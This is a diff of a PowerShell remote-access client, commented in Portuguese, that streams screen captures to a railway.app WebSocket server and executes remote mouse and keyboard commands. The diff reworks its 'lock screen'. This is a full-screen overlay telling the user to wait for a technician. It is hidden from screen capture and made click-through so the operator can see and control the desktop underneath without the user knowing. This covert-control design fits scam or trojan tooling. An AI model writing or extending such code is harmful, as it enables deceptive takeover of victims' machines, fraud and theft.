@@ -14,16 +14,7 @@ public static class Input {
     public static extern bool SetCursorPos(int X, int Y);
 
     [DllImport("user32.dll")]
-    public static extern bool GetCursorPos(out POINT lpPoint);
-
-    [DllImport("user32.dll")]
     public static extern int GetSystemMetrics(int nIndex);
-
-    [DllImport("kernel32.dll")]
-    public static extern uint GetLastError();
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct POINT { public int X, Y; }
 
     [StructLayout(LayoutKind.Sequential)]
     struct INPUT {
@@ -65,26 +56,20 @@ public static class Input {
     public static int ScreenW { get { return GetSystemMetrics(0); } }
     public static int ScreenH { get { return GetSystemMetrics(1); } }
 
-    public static bool MoveTo(int x, int y) {
-        return SetCursorPos(x, y);
-    }
+    public static bool MoveTo(int x, int y) { return SetCursorPos(x, y); }
 
     public static uint Click(int x, int y, int btn, int count) {
         SetCursorPos(x, y);
         Thread.Sleep(30);
-
         uint down, up;
         if (btn == 1) { down = MOUSEEVENTF_RIGHTDOWN; up = MOUSEEVENTF_RIGHTUP; }
         else if (btn == 2) { down = MOUSEEVENTF_MIDDLEDOWN; up = MOUSEEVENTF_MIDDLEUP; }
         else { down = MOUSEEVENTF_LEFTDOWN; up = MOUSEEVENTF_LEFTUP; }
-
         uint total = 0;
         for (int i = 0; i < count; i++) {
             INPUT[] inputs = new INPUT[2];
-            inputs[0].type = INPUT_MOUSE;
-            inputs[0].u.mi.dwFlags = down;
-            inputs[1].type = INPUT_MOUSE;
-            inputs[1].u.mi.dwFlags = up;
+            inputs[0].type = INPUT_MOUSE; inputs[0].u.mi.dwFlags = down;
+            inputs[1].type = INPUT_MOUSE; inputs[1].u.mi.dwFlags = up;
             total += SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
             Thread.Sleep(30);
         }
@@ -101,136 +86,33 @@ public static class Input {
 
     public static uint Key(ushort vk) {
         INPUT[] inputs = new INPUT[2];
-        inputs[0].type = INPUT_KEYBOARD;
-        inputs[0].u.ki.wVk = vk;
-        inputs[1].type = INPUT_KEYBOARD;
-        inputs[1].u.ki.wVk = vk;
-        inputs[1].u.ki.dwFlags = KEYEVENTF_KEYUP;
+        inputs[0].type = INPUT_KEYBOARD; inputs[0].u.ki.wVk = vk;
+        inputs[1].type = INPUT_KEYBOARD; inputs[1].u.ki.wVk = vk; inputs[1].u.ki.dwFlags = KEYEVENTF_KEYUP;
         return SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
     }
 
     public static uint KeyDown(ushort vk) {
         INPUT[] inputs = new INPUT[1];
-        inputs[0].type = INPUT_KEYBOARD;
-        inputs[0].u.ki.wVk = vk;
+        inputs[0].type = INPUT_KEYBOARD; inputs[0].u.ki.wVk = vk;
         return SendInput(1, inputs, Marshal.SizeOf(typeof(INPUT)));
     }
 
     public static uint KeyUp(ushort vk) {
         INPUT[] inputs = new INPUT[1];
-        inputs[0].type = INPUT_KEYBOARD;
-        inputs[0].u.ki.wVk = vk;
-        inputs[0].u.ki.dwFlags = KEYEVENTF_KEYUP;
+        inputs[0].type = INPUT_KEYBOARD; inputs[0].u.ki.wVk = vk; inputs[0].u.ki.dwFlags = KEYEVENTF_KEYUP;
         return SendInput(1, inputs, Marshal.SizeOf(typeof(INPUT)));
     }
 }
 "@
 Add-Type -TypeDefinition $inputCode
 
-# API para Lock Screen
-$lockApiCode = @"
-using System;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-using System.Drawing;
-using System.Threading;
-
-public class LockScreen {
-    [DllImport("user32.dll")]
-    static extern bool SetWindowDisplayAffinity(IntPtr hwnd, uint affinity);
-
-    [DllImport("user32.dll")]
-    static extern int GetWindowLong(IntPtr hwnd, int index);
-
-    [DllImport("user32.dll")]
-    static extern int SetWindowLong(IntPtr hwnd, int index, int newLong);
-
-    const int GWL_EXSTYLE = -20;
-    const int WS_EX_LAYERED = 0x80000;
-    const int WS_EX_TRANSPARENT = 0x20;
-    const uint WDA_EXCLUDEFROMCAPTURE = 0x11;
-
-    private static Form lockForm = null;
-    private static Thread lockThread = null;
-    private static bool isRunning = false;
-
-    public static void Show(string message) {
-        if (isRunning) return;
-        isRunning = true;
-
-        lockThread = new Thread(() => {
-            lockForm = new Form();
-            lockForm.Text = "";
-            lockForm.FormBorderStyle = FormBorderStyle.None;
-            lockForm.StartPosition = FormStartPosition.Manual;
-            lockForm.Location = new Point(0, 0);
-            lockForm.Size = Screen.PrimaryScreen.Bounds.Size;
-            lockForm.TopMost = true;
-            lockForm.BackColor = Color.FromArgb(15, 15, 20);
-            lockForm.ShowInTaskbar = false;
-
-            Label title = new Label();
-            title.Text = message;
-            title.Font = new Font("Segoe UI", 32, FontStyle.Bold);
-            title.ForeColor = Color.White;
-            title.AutoSize = true;
-            title.BackColor = Color.Transparent;
-
-            Label sub = new Label();
-            sub.Text = "Por favor, aguarde o tecnico liberar a tela.";
-            sub.Font = new Font("Segoe UI", 14);
-            sub.ForeColor = Color.FromArgb(150, 150, 160);
-            sub.AutoSize = true;
-            sub.BackColor = Color.Transparent;
-
-            lockForm.Controls.Add(title);
-            lockForm.Controls.Add(sub);
-
-            lockForm.Load += (s, e) => {
-                // Transparente para cliques
-                int style = GetWindowLong(lockForm.Handle, GWL_EXSTYLE);
-                SetWindowLong(lockForm.Handle, GWL_EXSTYLE, style | WS_EX_LAYERED | WS_EX_TRANSPARENT);
-
-                // Esconder da captura
-                SetWindowDisplayAffinity(lockForm.Handle, WDA_EXCLUDEFROMCAPTURE);
-
-                // Centralizar
-                int sw = lockForm.Width;
-                int sh = lockForm.Height;
-                title.Location = new Point((sw - title.Width) / 2, sh / 2 - 30);
-                sub.Location = new Point((sw - sub.Width) / 2, sh / 2 + 30);
-            };
-
-            Application.Run(lockForm);
-        });
-
-        lockThread.SetApartmentState(ApartmentState.STA);
-        lockThread.IsBackground = true;
-        lockThread.Start();
-    }
-
-    public static void Hide() {
-        isRunning = false;
-        if (lockForm != null && !lockForm.IsDisposed) {
-            try {
-                lockForm.Invoke(new Action(() => {
-                    lockForm.Close();
-                    lockForm.Dispose();
-                }));
-            } catch { }
-        }
-        lockForm = null;
-        lockThread = null;
-    }
-}
-"@
-Add-Type -TypeDefinition $lockApiCode -ReferencedAssemblies System.Windows.Forms, System.Drawing
-
 $Global:URL = "wss://web-production-9d7cc.up.railway.app"
 $Global:id = $null
 $Global:run = $true
 $Global:panel = $false
 $Global:locked = $false
+$Global:lockRunspace = $null
+$Global:lockPowershell = $null
 $Global:scale = 0.75
 $Global:quality = 70
 
@@ -280,7 +162,6 @@ function Screen {
 
     $b64 = [Convert]::ToBase64String($ms.ToArray())
     $ms.Dispose()
-
     return @{ frame=$b64; width=$sw; height=$sh }
 }
 
@@ -295,7 +176,7 @@ function DoClick($x, $y, $btn, $n) {
     $ry = [int]($y / $Global:scale)
     $b = if ($btn -eq 'right') { 1 } elseif ($btn -eq 'middle') { 2 } else { 0 }
     $r = [Input]::Click($rx, $ry, $b, $n)
-    Write-Host "  CLICK ($rx,$ry) btn=$btn n=$n result=$r" -ForegroundColor Green
+    Write-Host "  CLICK ($rx,$ry) btn=$btn result=$r" -ForegroundColor Green
 }
 
 function DoKey($k) {
@@ -312,9 +193,7 @@ function DoCombo($keys) {
         $vk = GetVK $k
         if ($vk -gt 0) { $vks += $vk }
     }
-
-    Write-Host "  COMBO $($keys -join '+') vks=$($vks -join ',')" -ForegroundColor Cyan
-
+    Write-Host "  COMBO $($keys -join '+')" -ForegroundColor Cyan
     foreach ($vk in $vks) { [Input]::KeyDown([uint16]$vk); Start-Sleep -Milliseconds 20 }
     Start-Sleep -Milliseconds 50
     for ($i = $vks.Count - 1; $i -ge 0; $i--) { [Input]::KeyUp([uint16]$vks[$i]); Start-Sleep -Milliseconds 20 }
@@ -335,14 +214,96 @@ function Lock($msg) {
     if ($Global:locked) { return }
     $Global:locked = $true
     Write-Host "  LOCK: $msg" -ForegroundColor Magenta
-    [LockScreen]::Show($msg)
+
+    $code = {
+        param($message)
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+
+        Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class LockAPI {
+    [DllImport("user32.dll")]
+    public static extern bool SetWindowDisplayAffinity(IntPtr hwnd, uint affinity);
+    [DllImport("user32.dll")]
+    public static extern int GetWindowLong(IntPtr hwnd, int index);
+    [DllImport("user32.dll")]
+    public static extern int SetWindowLong(IntPtr hwnd, int index, int value);
+    public const int GWL_EXSTYLE = -20;
+    public const int WS_EX_LAYERED = 0x80000;
+    public const int WS_EX_TRANSPARENT = 0x20;
+    public const uint WDA_EXCLUDEFROMCAPTURE = 0x11;
+}
+"@
+
+        $form = New-Object Windows.Forms.Form
+        $form.FormBorderStyle = 'None'
+        $form.StartPosition = 'Manual'
+        $form.Location = [Drawing.Point]::new(0, 0)
+        $form.Size = [Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
+        $form.TopMost = $true
+        $form.BackColor = [Drawing.Color]::FromArgb(10, 10, 15)
+        $form.ShowInTaskbar = $false
+
+        $title = New-Object Windows.Forms.Label
+        $title.Text = $message
+        $title.Font = New-Object Drawing.Font("Segoe UI", 36, [Drawing.FontStyle]::Bold)
+        $title.ForeColor = [Drawing.Color]::White
+        $title.AutoSize = $true
+
+        $sub = New-Object Windows.Forms.Label
+        $sub.Text = "Por favor, aguarde o tecnico liberar a tela."
+        $sub.Font = New-Object Drawing.Font("Segoe UI", 16)
+        $sub.ForeColor = [Drawing.Color]::Gray
+        $sub.AutoSize = $true
+
+        $form.Controls.Add($title)
+        $form.Controls.Add($sub)
+
+        $form.Add_Load({
+            $sw = $form.Width
+            $sh = $form.Height
+            $title.Location = [Drawing.Point]::new(($sw - $title.Width) / 2, $sh / 2 - 50)
+            $sub.Location = [Drawing.Point]::new(($sw - $sub.Width) / 2, $sh / 2 + 20)
+
+            # Esconder da captura de tela (admin ve por baixo)
+            [LockAPI]::SetWindowDisplayAffinity($form.Handle, [LockAPI]::WDA_EXCLUDEFROMCAPTURE) | Out-Null
+
+            # Transparente para cliques (admin controla por baixo)
+            $style = [LockAPI]::GetWindowLong($form.Handle, [LockAPI]::GWL_EXSTYLE)
+            [LockAPI]::SetWindowLong($form.Handle, [LockAPI]::GWL_EXSTYLE, $style -bor [LockAPI]::WS_EX_LAYERED -bor [LockAPI]::WS_EX_TRANSPARENT) | Out-Null
+        })
+
+        [Windows.Forms.Application]::Run($form)
+    }
+
+    $Global:lockRunspace = [runspacefactory]::CreateRunspace()
+    $Global:lockRunspace.ApartmentState = "STA"
+    $Global:lockRunspace.ThreadOptions = "ReuseThread"
+    $Global:lockRunspace.Open()
+
+    $Global:lockPowershell = [powershell]::Create()
+    $Global:lockPowershell.Runspace = $Global:lockRunspace
+    $Global:lockPowershell.AddScript($code).AddArgument($msg) | Out-Null
+    $Global:lockPowershell.BeginInvoke() | Out-Null
 }
 
 function Unlock {
     if (-not $Global:locked) { return }
     $Global:locked = $false
     Write-Host "  UNLOCK" -ForegroundColor Green
-    [LockScreen]::Hide()
+
+    if ($Global:lockPowershell) {
+        $Global:lockPowershell.Stop()
+        $Global:lockPowershell.Dispose()
+        $Global:lockPowershell = $null
+    }
+    if ($Global:lockRunspace) {
+        $Global:lockRunspace.Close()
+        $Global:lockRunspace.Dispose()
+        $Global:lockRunspace = $null
+    }
 }
 
 function Run {
@@ -383,48 +344,21 @@ function Run {
                         $msg = [Text.Encoding]::UTF8.GetString($buf, 0, $res.Count) | ConvertFrom-Json
 
                         switch ($msg.type) {
-                            "registered" {
-                                $Global:id = $msg.clientId
-                                Write-Host "  ID: $($Global:id)" -ForegroundColor Yellow
-                            }
-                            "panel-connected" {
-                                $Global:panel = $true
-                                Write-Host "  Painel conectou!" -ForegroundColor Green
-                            }
-                            "panel-disconnected" {
-                                $Global:panel = $false
-                                Unlock
-                                Write-Host "  Painel desconectou" -ForegroundColor Red
-                            }
-                            "mouse-click" {
-                                DoClick $msg.x $msg.y $msg.button $(if ($msg.clicks) { $msg.clicks } else { 1 })
-                            }
-                            "mouse-move" {
-                                DoMove $msg.x $msg.y
-                            }
-                            "mouse-scroll" {
-                                DoScroll $msg.delta
-                            }
-                            "key-press" {
-                                DoKey $msg.key
-                            }
-                            "key-combination" {
-                                DoCombo $msg.keys
-                            }
-                            "lock-screen" {
-                                Lock $(if ($msg.message) { $msg.message } else { "Aguarde..." })
-                            }
-                            "unlock-screen" {
-                                Unlock
-                            }
+                            "registered" { $Global:id = $msg.clientId; Write-Host "  ID: $($Global:id)" -ForegroundColor Yellow }
+                            "panel-connected" { $Global:panel = $true; Write-Host "  Painel conectou!" -ForegroundColor Green }
+                            "panel-disconnected" { $Global:panel = $false; Unlock; Write-Host "  Painel desconectou" -ForegroundColor Red }
+                            "mouse-click" { DoClick $msg.x $msg.y $msg.button $(if ($msg.clicks) { $msg.clicks } else { 1 }) }
+                            "mouse-move" { DoMove $msg.x $msg.y }
+                            "mouse-scroll" { DoScroll $msg.delta }
+                            "key-press" { DoKey $msg.key }
+                            "key-combination" { DoCombo $msg.keys }
+                            "lock-screen" { Lock $(if ($msg.message) { $msg.message } else { "Aguarde..." }) }
+                            "unlock-screen" { Unlock }
                             "set-quality" {
                                 $Global:quality = if ($msg.quality) { $msg.quality } else { 70 }
                                 $Global:scale = if ($msg.scale) { $msg.scale } else { 0.75 }
                             }
-                            "disconnect-client" {
-                                Unlock
-                                $Global:run = $false
-                            }
+                            "disconnect-client" { Unlock; $Global:run = $false }
                         }
                     }
                 }
@@ -433,27 +367,18 @@ function Run {
                     $ft.Restart()
                     try {
                         $cap = Screen
-                        $frame = @{
-                            type = "screen-frame"
-                            clientId = $Global:id
-                            frame = $cap.frame
-                            width = $cap.width
-                            height = $cap.height
-                        } | ConvertTo-Json -Compress
+                        $frame = @{ type="screen-frame"; clientId=$Global:id; frame=$cap.frame; width=$cap.width; height=$cap.height } | ConvertTo-Json -Compress
                         $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes($frame)), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null
                     } catch { break }
                 }
 
                 if ($pt.ElapsedMilliseconds -ge 15000) {
                     $pt.Restart()
-                    try {
-                        $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes('{"type":"ping"}')), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null
-                    } catch {}
+                    try { $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes('{"type":"ping"}')), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null } catch {}
                 }
 
                 Start-Sleep -Milliseconds 20
             }
-
             $ws.Dispose()
         } catch {
             Write-Host "  Erro: $($_.Exception.Message)" -ForegroundColor Red
